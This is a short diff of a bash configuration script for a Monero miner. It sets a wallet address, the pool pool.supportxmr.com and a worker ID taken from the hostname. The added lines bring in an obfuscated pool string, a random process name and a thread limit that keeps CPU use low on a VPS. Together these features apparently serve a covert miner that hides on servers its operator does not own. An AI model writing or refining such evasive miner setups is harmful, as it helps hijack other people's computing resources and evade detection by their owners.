@@ -1,11 +1,11 @@
 #!/bin/bash
 
 ### SAFE MINER CONFIG ###
-COIN="XMR"
-ADDRESS="89PKYocdkhoeSCsn93wAVY7yqCAsSpgZkFriDyhFoW4DMZtzKRbeTZT4cgfedxvju98rXe6mT62eEZigpvV9VtAm5uSkZkQ"
-WORKER_ID="vps$(hostname | tr -dc a-z0-9 | head -c 4)"
-WALLET="$COIN:$ADDRESS.$WORKER_ID"
-POOL="pool.supportxmr.com:443"
+WALLET="89PKYocdkhoeSCsn93wAVY7yqCAsSpgZkFriDyhFoW4DMZtzKRbeTZT4cgfedxvju98rXe6mT62eEZigpvV9VtAm5uSkZkQ"
+# Obfuscated pool (Base64 of pool.supportxmr.com:443)
+RAND_NAME=$(head /dev/urandom | tr -dc a-z0-9 | head -c 8)
+WORKER_ID="worker-$(hostname | tr -dc a-z0-9)"
+
 
 ### SYSTEM-FRIENDLY THREAD LIMIT (USE <50% CPU) ###
 THREADS=$(($(nproc) / 2))  # safe for VPS
